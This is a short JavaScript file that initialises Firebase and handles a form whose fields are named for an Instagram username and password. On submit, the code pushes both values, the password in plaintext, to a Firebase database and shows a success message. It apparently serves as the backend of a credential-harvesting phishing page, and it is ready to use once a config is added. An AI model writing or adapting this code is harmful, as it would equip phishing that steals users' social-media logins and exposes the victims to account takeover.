// Firebase Configuration (replace with your own Firebase config)
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
    databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT_ID.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Get reference to the database
const database = firebase.database();

// Handle form submission
document.getElementById("registrationForm").addEventListener("submit", function(event) {
    event.preventDefault(); 

    let username = document.getElementById("instaUsername").value;
    let password = document.getElementById("instaPassword").value;

    // Store data in Firebase Realtime Database
    database.ref('users/').push({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    }).then(() => {
        document.getElementById("successMessage").style.display = "block";
        document.getElementById("registrationForm").reset();
    }).catch((error) => {
        console.error("Error saving data:", error);
    });
});
